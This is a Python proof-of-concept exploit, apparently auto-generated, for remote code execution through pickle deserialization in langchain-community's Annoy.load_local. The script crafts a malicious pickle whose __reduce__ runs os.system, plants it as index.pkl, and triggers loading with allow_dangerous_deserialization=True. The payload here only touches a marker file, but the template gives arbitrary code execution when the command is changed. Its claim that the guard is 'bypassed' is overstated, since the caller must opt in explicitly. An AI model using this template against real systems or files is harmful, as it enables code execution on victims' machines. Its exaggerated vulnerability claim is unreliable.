#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-017
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_33.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only RCE via pickle deserialization.

Vulnerability: The load_local function in langchain_community/vectorstores/annoy.py
uses pickle.load on a file path constructed from user-controlled folder_path.
Although there is a guard (allow_dangerous_deserialization) that must be set to True,
the guard is a developer-side check that can be bypassed if the caller sets it to True.
An attacker who can control folder_path can supply a malicious pickle file, leading to
arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Setting up a local directory structure that mimics the expected format
3. Calling load_local with allow_dangerous_deserialization=True and the malicious folder_path

Usage: python3 poc_exploit.py [target_folder_path]
"""

import os
import sys
import pickle
import tempfile
import subprocess
from pathlib import Path

# Configuration
TARGET_FOLDER = sys.argv[1] if len(sys.argv) > 1 else "/tmp/exploit_test"

def create_malicious_pickle():
    """Create a malicious pickle file that executes a benign command."""
    class MaliciousPayload:
        def __reduce__(self):
            # Benign command: create a file to prove code execution
            return (os.system, ("touch /tmp/poc_success.txt",))
    
    return pickle.dumps(MaliciousPayload())

def setup_exploit_environment(folder_path):
    """Set up the directory structure and malicious pickle file."""
    path = Path(folder_path)
    path.mkdir(parents=True, exist_ok=True)
    
    # Create the malicious index.pkl file
    malicious_data = create_malicious_pickle()
    
    # The pickle.load expects a tuple of (docstore, index_to_docstore_id, config_object)
    # We'll create a minimal valid structure that triggers our payload during unpickling
    # The actual payload executes during the unpickling process itself
    
    # Create a minimal valid pickle that will execute our command
    # We use a simple approach: the pickle itself contains the malicious code
    with open(path / "index.pkl", "wb") as f:
        f.write(malicious_data)
    
    # Create a minimal index.annoy file (required by the function)
    # This is just a placeholder - the actual exploit is in the pickle
    with open(path / "index.annoy", "wb") as f:
        f.write(b"dummy")
    
    print(f"[+] Exploit environment set up at: {folder_path}")
    print(f"[+] Malicious pickle file created at: {path / 'index.pkl'}")

def trigger_exploit(folder_path):
    """Trigger the vulnerable function with the malicious pickle."""
    # We need to import the vulnerable function
    # Note: This requires langchain-community to be installed
    try:
        from langchain_community.vectorstores.annoy import Annoy
    except ImportError:
        print("[-] langchain-community not installed. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "langchain-community"])
        from langchain_community.vectorstores.annoy import Annoy
    
    # Create a mock embeddings object (required by load_local)
    class MockEmbeddings:
        def embed_query(self, text):
            return [0.0] * 100  # Return dummy embeddings
    
    embeddings = MockEmbeddings()
    
    print(f"[+] Calling load_local with folder_path: {folder_path}")
    print(f"[+] allow_dangerous_deserialization set to True")
    
    try:
        # This will trigger the malicious pickle deserialization
        result = Annoy.load_local(
            folder_path=folder_path,
            embeddings=embeddings,
            allow_dangerous_deserialization=True
        )
        print(f"[+] Function returned successfully: {result}")
    except Exception as e:
        print(f"[!] Exception occurred (expected due to malformed data): {e}")
        # The command should have executed before the exception
        pass

def verify_exploit():
    """Verify that the benign command was executed."""
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: /tmp/poc_success.txt was created!")
        print("[+] Code execution achieved via pickle deserialization")
        # Clean up
        os.remove("/tmp/poc_success.txt")
        return True
    else:
        print("[-] Failed: /tmp/poc_success.txt was not created")
        return False

def main():
    print("=" * 60)
    print("PoC: langchain-community RCE via pickle deserialization")
    print("=" * 60)
    
    # Step 1: Set up the exploit environment
    print("\n[*] Step 1: Setting up exploit environment...")
    setup_exploit_environment(TARGET_FOLDER)
    
    # Step 2: Trigger the vulnerability
    print("\n[*] Step 2: Triggering vulnerability...")
    trigger_exploit(TARGET_FOLDER)
    
    # Step 3: Verify code execution
    print("\n[*] Step 3: Verifying code execution...")
    success = verify_exploit()
    
    # Clean up
    print("\n[*] Cleaning up...")
    import shutil
    shutil.rmtree(TARGET_FOLDER, ignore_errors=True)
    
    if success:
        print("\n[+] Exploit successful! The vulnerability is confirmed.")
        print("[+] The guard (allow_dangerous_deserialization) does NOT protect")
        print("[+] against malicious pickle files when set to True.")
    else:
        print("\n[-] Exploit failed. Check the target environment.")
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
